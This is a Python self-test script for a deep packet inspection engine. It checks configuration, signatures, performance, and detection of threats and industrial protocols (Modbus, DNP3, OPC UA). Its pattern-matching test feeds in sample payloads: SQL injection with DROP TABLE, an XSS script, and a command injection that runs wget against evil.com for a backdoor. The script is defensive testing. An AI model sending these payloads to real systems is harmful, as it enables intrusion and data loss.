#!/usr/local/bin/python3
# test_engine.py - Run DPI engine self-tests
"""
Script to run self-diagnostic tests for the DeepInspectorEngine DPI engine.
Tests configuration loading, signature loading, pattern matching, performance,
and industrial protocol detection using the engine's components.
"""

import os
import json
import time
import logging
from datetime import datetime
from deepinspector_engine import (
    DeepInspectorEngine,
    PacketInfo,
    ProtocolType,
    EngineConfig,
    GeneralConfig,
    ProtocolConfig,
    DetectionConfig,
    AdvancedConfig,
)

# Setup logging system for tests
def setup_logging():
    """
    Configure logging for tests, mirroring the engine's logging format.
    Logs to both file and console.
    """
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(funcName)s:%(lineno)d - %(message)s',
        handlers=[
            logging.FileHandler('/var/log/deepinspector/test_engine.log', mode='a', encoding='utf-8'),
            logging.StreamHandler()
        ]
    )
    return logging.getLogger(__name__)

logger = setup_logging()

def run_tests():
    """
    Run all self-diagnostic tests for the DPI engine.
    Returns a dictionary with test results and a summary.
    """
    results = {
        'timestamp': datetime.now().isoformat(),
        'tests': [],
        'overall_status': 'pass',
        'summary': {}
    }

    # Initialize the DPI engine
    try:
        engine = DeepInspectorEngine()
        if not engine.initialize():
            logger.error("Failed to initialize DeepInspectorEngine")
            results['overall_status'] = 'fail'
            results['tests'].append({
                'name': 'Engine Initialization',
                'description': 'Test if DPI engine initializes correctly',
                'status': 'fail',
                'details': ['Failed to initialize engine']
            })
            return results
    except Exception as e:
        logger.error(f"Critical error initializing engine: {e}")
        results['overall_status'] = 'fail'
        results['tests'].append({
            'name': 'Engine Initialization',
            'description': 'Test if DPI engine initializes correctly',
            'status': 'fail',
            'details': [f'Error: {str(e)}']
        })
        return results

    # Run individual tests
    results['tests'].append(test_configuration(engine))
    results['tests'].append(test_signatures(engine))
    results['tests'].append(test_pattern_matching(engine))
    results['tests'].append(test_performance(engine))
    results['tests'].append(test_industrial_protocols(engine))

    # Calculate summary
    passed = sum(1 for test in results['tests'] if test['status'] == 'pass')
    failed = sum(1 for test in results['tests'] if test['status'] == 'fail')
    
    results['summary'] = {
        'total_tests': len(results['tests']),
        'passed': passed,
        'failed': failed,
        'success_rate': (passed / len(results['tests'])) * 100 if results['tests'] else 0
    }

    if failed > 0:
        results['overall_status'] = 'fail'

    # Log results
    logger.info(f"Test summary: {passed}/{len(results['tests'])} tests passed")
    if failed > 0:
        logger.warning(f"{failed} tests failed")

    # Cleanup engine resources
    try:
        engine._cleanup()
        logger.info("Engine resources cleaned up")
    except Exception as e:
        logger.error(f"Error during cleanup: {e}")

    return results

def test_configuration(engine: DeepInspectorEngine):
    """
    Test configuration loading and validation using EngineConfig.
    Verifies that all required configuration sections are present.
    Args:
        engine: Initialized DeepInspectorEngine instance.
    Returns:
        Dict containing test results.
    """
    test = {
        'name': 'Configuration Loading',
        'description': 'Test if DPI configuration loads correctly',
        'status': 'pass',
        'details': []
    }

    try:
        # Check if configuration was loaded
        if engine.config is None or not isinstance(engine.config, EngineConfig):
            test['status'] = 'fail'
            test['details'].append('Configuration not loaded or invalid')
            logger.error("Configuration not loaded or invalid")
            return test

        # Validate required configuration sections
        required_sections = [
            ('general', GeneralConfig),
            ('protocols', ProtocolConfig),
            ('detection', DetectionConfig),
            ('advanced', AdvancedConfig)
        ]
        for section_name, section_type in required_sections:
            section = getattr(engine.config, section_name)
            if section is None or not isinstance(section, section_type):
                test['status'] = 'fail'
                test['details'].append(f'Missing or invalid section: {section_name}')
                logger.error(f"Missing or invalid configuration section: {section_name}")
            else:
                test['details'].append(f'Section {section_name}: OK')
                logger.info(f"Configuration section {section_name} loaded")

        # Validate industrial settings
        if engine.config.protocols.industrial_protocols:
            test['details'].append('Industrial protocols: ENABLED')
            logger.info("Industrial protocols enabled")
        else:
            test['details'].append('Industrial protocols: DISABLED')
            logger.info("Industrial protocols disabled")

    except Exception as e:
        test['status'] = 'fail'
        test['details'].append(f'Error: {str(e)}')
        logger.error(f"Configuration test error: {e}")

    return test

def test_signatures(engine: DeepInspectorEngine):
    """
    Test signature loading by checking threat detectors' signatures.
    Verifies that patterns/signatures are loaded for each detector.
    Args:
        engine: Initialized DeepInspectorEngine instance.
    Returns:
        Dict containing test results.
    """
    test = {
        'name': 'Signature Loading',
        'description': 'Test if threat signatures load correctly',
        'status': 'pass',
        'details': []
    }

    try:
        total_patterns = 0
        for detector in engine.threat_detectors:
            # Assume detectors have a 'patterns' or 'signatures' attribute (to be verified)
            try:
                patterns = getattr(detector, 'patterns', getattr(detector, 'signatures', {}))
                for category, pattern_list in patterns.items():
                    total_patterns += len(pattern_list)
                    test['details'].append(f'{detector.name} - {category}: {len(pattern_list)} patterns')
                    logger.info(f"Loaded {len(pattern_list)} patterns for {detector.name} - {category}")
            except AttributeError:
                test['status'] = 'fail'
                test['details'].append(f'No patterns/signatures found for {detector.name}')
                logger.error(f"No patterns/signatures found for {detector.name}")

        if total_patterns == 0:
            test['status'] = 'fail'
            test['details'].append('No threat patterns or signatures loaded')
            logger.error("No threat patterns or signatures loaded")
        else:
            test['details'].append(f'Total patterns/signatures loaded: {total_patterns}')
            logger.info(f"Total patterns/signatures loaded: {total_patterns}")

    except Exception as e:
        test['status'] = 'fail'
        test['details'].append(f'Error: {str(e)}')
        logger.error(f"Signature test error: {e}")

    return test

def test_pattern_matching(engine: DeepInspectorEngine):
    """
    Test pattern matching by processing simulated packets through the engine.
    Uses PacketInfo to simulate threats and checks detection logs.
    Args:
        engine: Initialized DeepInspectorEngine instance.
    Returns:
        Dict containing test results.
    """
    test = {
        'name': 'Pattern Matching',
        'description': 'Test threat detection pattern matching',
        'status': 'pass',
        'details': []
    }

    try:
        # Test payloads for various threats
        test_payloads = [
            ('EICAR test string', b'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*', ProtocolType.TCP, 80),
            ('SQL injection', b"' OR '1'='1'; DROP TABLE users; --", ProtocolType.TCP, 80),
            ('XSS attempt', b'<script>alert("XSS")</script>', ProtocolType.TCP, 80),
            ('Command injection', b'ls -la; wget http://evil.com/backdoor', ProtocolType.TCP, 80),
            ('Modbus attack', b'\x00\x01\x00\x00\x00\x06\x01\x08', ProtocolType.TCP, 502)
        ]

        detected = 0
        for test_name, payload, protocol, port in test_payloads:
            # Create a mock PacketInfo object
            packet_info = PacketInfo(
                timestamp=datetime.now(),
                interface='test0',
                source_ip='192.168.1.1',
                dest_ip='192.168.1.2',
                protocol=protocol,
                size=len(payload),
                payload=payload,
                tcp_port=port if protocol == ProtocolType.TCP else None,
                udp_port=port if protocol == ProtocolType.UDP else None
            )

            # Process packet through engine
            engine.process_packet(packet_info)
            
            # Check detection logs
            log_path = '/var/log/deepinspector/detections.log'
            threats_found = False
            if os.path.exists(log_path):
                with open(log_path, 'r') as f:
                    lines = f.readlines()[-5:]  # Check last 5 lines for recent detections
                    for line in lines:
                        try:
                            detection = json.loads(line.strip())
                            if detection['timestamp'].startswith(datetime.now().date().isoformat()):
                                threats_found = True
                                break
                        except json.JSONDecodeError:
                            continue

            if threats_found:
                detected += 1
                test['details'].append(f'{test_name}: DETECTED')
                logger.info(f"{test_name}: Threat detected")
            else:
                test['details'].append(f'{test_name}: NOT DETECTED')
                logger.warning(f"{test_name}: Threat not detected")

        detection_rate = (detected / len(test_payloads)) * 100
        test['details'].append(f'Detection rate: {detection_rate:.1f}%')
        logger.info(f"Detection rate: {detection_rate:.1f}%")
        
        if detection_rate < 80:
            test['status'] = 'fail'
            logger.warning("Detection rate below 80% threshold")

    except Exception as e:
        test['status'] = 'fail'
        test['details'].append(f'Error: {str(e)}')
        logger.error(f"Pattern matching test error: {e}")

    return test

def test_performance(engine: DeepInspectorEngine):
    """
    Test engine performance by processing multiple packets.
    Measures processing time and rate for simulated packets.
    Args:
        engine: Initialized DeepInspectorEngine instance.
    Returns:
        Dict containing test results.
    """
    test = {
        'name': 'Performance Test',
        'description': 'Test engine performance with packet processing',
        'status': 'pass',
        'details': []
    }

    try:
        # Simulate HTTP packet
        test_payload = b"GET /test HTTP/1.1\r\nHost: example.com\r\n\r\n" * 100
        packet_info = PacketInfo(
            timestamp=datetime.now(),
            interface='test0',
            source_ip='192.168.1.1',
            dest_ip='192.168.1.2',
            protocol=ProtocolType.TCP,
            size=len(test_payload),
            payload=test_payload,
            tcp_port=80
        )

        start_time = time.time()
        iterations = 1000  # Realistic number of packets for testing
        
        for _ in range(iterations):
            engine.process_packet(packet_info)
        
        end_time = time.time()
        processing_time = end_time - start_time
        
        test['details'].append(f'Processed {iterations} packets in {processing_time:.3f} seconds')
        test['details'].append(f'Processing rate: {iterations/processing_time:.1f} packets/second')
        logger.info(f"Processed {iterations} packets in {processing_time:.3f} seconds")
        
        # Threshold adjusted for realistic DPI processing
        if processing_time > 5.0:
            test['status'] = 'fail'
            test['details'].append('Performance below expected threshold (5 seconds)')
            logger.warning("Performance test failed: processing time exceeded 5 seconds")

    except Exception as e:
        test['status'] = 'fail'
        test['details'].append(f'Error: {str(e)}')
        logger.error(f"Performance test error: {e}")

    return test

def test_industrial_protocols(engine: DeepInspectorEngine):
    """
    Test industrial protocol detection with simulated packets.
    Verifies detection of Modbus, DNP3, and OPC UA threats.
    Args:
        engine: Initialized DeepInspectorEngine instance.
    Returns:
        Dict containing test results.
    """
    test = {
        'name': 'Industrial Protocol Detection',
        'description': 'Test industrial protocol detection capabilities',
        'status': 'pass',
        'details': []
    }

    try:
        # Test industrial protocol packets
        industrial_tests = [
            ('Modbus function code', b'\x00\x01\x00\x00\x00\x06\x01\x08', ProtocolType.TCP, 502),  # Suspicious function code
            ('DNP3 header', b'\x05\x64\x05\xc0\x01\x00\xff\xff', ProtocolType.TCP, 20000),  # Broadcast address
            ('OPC UA message', b'OPC\x00\x00\x01\x00\x00', ProtocolType.TCP, 4840)  # Oversized message
        ]

        detected = 0
        for test_name, payload, protocol, port in industrial_tests:
            # Create mock PacketInfo object
            packet_info = PacketInfo(
                timestamp=datetime.now(),
                interface='test0',
                source_ip='192.168.1.1',
                dest_ip='192.168.1.2',
                protocol=protocol,
                size=len(payload),
                payload=payload,
                tcp_port=port if protocol == ProtocolType.TCP else None,
                udp_port=port if protocol == ProtocolType.UDP else None
            )

            # Process packet through engine
            engine.process_packet(packet_info)

            # Check detection logs for industrial threats
            log_path = '/var/log/deepinspector/detections.log'
            threats_found = False
            if os.path.exists(log_path):
                with open(log_path, 'r') as f:
                    lines = f.readlines()[-5:]  # Check last 5 lines for recent detections
                    for line in lines:
                        try:
                            detection = json.loads(line.strip())
                            if detection['timestamp'].startswith(datetime.now().date().isoformat()) and \
                               detection['threat_type'].startswith('industrial_threat'):
                                threats_found = True
                                break
                        except json.JSONDecodeError:
                            continue

            if threats_found:
                detected += 1
                test['details'].append(f'{test_name}: DETECTED')
                logger.info(f"{test_name}: Industrial threat detected")
            else:
                test['details'].append(f'{test_name}: NOT DETECTED')
                logger.warning(f"{test_name}: Industrial threat not detected")

        detection_rate = (detected / len(industrial_tests)) * 100
        test['details'].append(f'Industrial detection rate: {detection_rate:.1f}%')
        logger.info(f"Industrial detection rate: {detection_rate:.1f}%")
        
        if detection_rate < 70:
            test['status'] = 'fail'
            logger.warning("Industrial detection rate below 70% threshold")

    except Exception as e:
        test['status'] = 'fail'
        test['details'].append(f'Error: {str(e)}')
        logger.error(f"Industrial protocol test error: {e}")

    return test

if __name__ == "__main__":
    # Run tests and output results
    results = run_tests()
    print(json.dumps(results, indent=2))